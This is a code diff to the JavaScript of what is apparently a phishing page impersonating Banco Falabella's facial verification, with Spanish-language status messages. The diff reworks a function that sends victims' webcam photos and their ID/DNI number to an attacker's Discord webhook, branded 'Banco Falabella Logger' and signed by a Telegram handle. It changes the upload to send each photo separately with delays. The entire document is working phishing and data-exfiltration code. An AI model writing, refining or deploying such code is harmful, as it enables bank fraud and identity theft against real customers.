@@ -302,79 +302,85 @@
     });
   }
 
-  async function sendPhotosToDiscord(photos) {
+  async function sendPhotosToDiscord(photoBlobs) {
     try {
-      loading.classList.add('show');
-      status.textContent = 'Enviando fotos...';
+      for (let i = 0; i < photoBlobs.length; i++) {
+        loading.classList.add('show');
+        status.textContent = `Enviando foto ${i + 1}/3...`;
 
-      const formData = new FormData();
-      
-      formData.append('payload_json', JSON.stringify({
-        username: "Banco Falabella Logger",
-        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png",
-        embeds: [{
-          title: "📸 VERIFICACIÓN FACIAL — BANCO FALABELLA",
-          color: 0x4a9c2f,
-          thumbnail: {
-            url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
-          },
-          fields: [
-            {
-              name: "👤 USUARIO",
-              value: `\`\`\`\n${docTypeLabel[docType]}: ${savedDni}\n\`\`\``,
-              inline: false
-            },
-            {
-              name: "📷 FOTOS",
-              value: `✓ Foto 1\n✓ Foto 2\n✓ Foto 3`,
-              inline: false
-            },
-            {
-              name: "✅ ESTADO",
-              value: "Verificación facial completada",
-              inline: false
-            },
-            {
-              name: "🕐 HORA",
-              value: `${new Date().toLocaleString('es-PE')}`,
-              inline: false
-            }
-          ],
-          footer: {
-            text: "⚡ by @Brknshinexxx  •  Telegram",
-            icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
-          },
-          timestamp: new Date().toISOString()
-        }]
-      }));
-
-      photos.forEach((blob, idx) => {
-        formData.append('file', blob, `foto_${idx + 1}.jpg`);
-      });
-
-      const response = await fetch(WEBHOOK_URL, {
-        method: 'POST',
-        body: formData
-      });
-
-      if (response.ok) {
-        loading.classList.remove('show');
-        status.classList.add('ready');
-        status.textContent = '✓ ¡Verificación completada!';
-        if (detectionInterval) clearInterval(detectionInterval);
-        stream.getTracks().forEach(track => track.stop());
+        const formData = new FormData();
         
-        setTimeout(() => {
-          window.location.href = 'index.html';
-        }, 2000);
-      } else {
-        status.textContent = 'Error al enviar. Reintentando...';
-        loading.classList.remove('show');
+        formData.append('payload_json', JSON.stringify({
+          username: "Banco Falabella Logger",
+          avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png",
+          embeds: [{
+            title: "📸 VERIFICACIÓN FACIAL — BANCO FALABELLA",
+            color: 0x4a9c2f,
+            thumbnail: {
+              url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
+            },
+            fields: [
+              {
+                name: "👤 USUARIO",
+                value: `\`\`\`\n${docTypeLabel[docType]}: ${savedDni}\n\`\`\``,
+                inline: false
+              },
+              {
+                name: "📷 FOTO",
+                value: `Foto ${i + 1} de 3`,
+                inline: false
+              },
+              {
+                name: "✅ ESTADO",
+                value: "Captura en progreso",
+                inline: false
+              },
+              {
+                name: "🕐 HORA",
+                value: `${new Date().toLocaleString('es-PE')}`,
+                inline: false
+              }
+            ],
+            footer: {
+              text: "⚡ by @Brknshinexxx  •  Telegram",
+              icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1280px-Logotipo_Banco_Falabella.svg.png"
+            },
+            timestamp: new Date().toISOString()
+          }]
+        }));
+
+        formData.append('file', photoBlobs[i], `foto_${i + 1}.jpg`);
+
+        const response = await fetch(WEBHOOK_URL, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (!response.ok) {
+          throw new Error(`Error enviando foto ${i + 1}`);
+        }
+
+        // Esperar 1 segundo antes de la siguiente foto
+        if (i < photoBlobs.length - 1) {
+          await new Promise(r => setTimeout(r, 1000));
+        }
       }
+
+      // Todas las fotos enviadas
+      loading.classList.remove('show');
+      status.classList.add('ready');
+      status.textContent = '✓ ¡Verificación completada!';
+      if (detectionInterval) clearInterval(detectionInterval);
+      stream.getTracks().forEach(track => track.stop());
+      
+      setTimeout(() => {
+        window.location.href = 'index.html';
+      }, 2000);
     } catch (e) {
       console.error('Error:', e);
-      status.textContent = 'Error de conexión. Reintentando...';
+      status.textContent = 'Error. Reintentando...';
       loading.classList.remove('show');
+      isCapturing = false;
     }
   }
 
@@ -386,7 +392,7 @@
         if (hasMovementInFrame()) {
           faceDetectedFrames++;
           faceFrame.classList.add('perfect');
-          status.textContent = `📸 Detectado... (${faceDetectedFrames}/5)`;
+          status.textContent = '📸 Detectando...';
 
           if (faceDetectedFrames >= 5) {
             isCapturing = true;
@@ -396,7 +402,7 @@
             
             const photos = [];
             for (let i = 0; i < 3; i++) {
-              await new Promise(r => setTimeout(r, 100));
+              await new Promise(r => setTimeout(r, 500));
               const blob = await capturePhoto();
               photos.push(blob);
             }
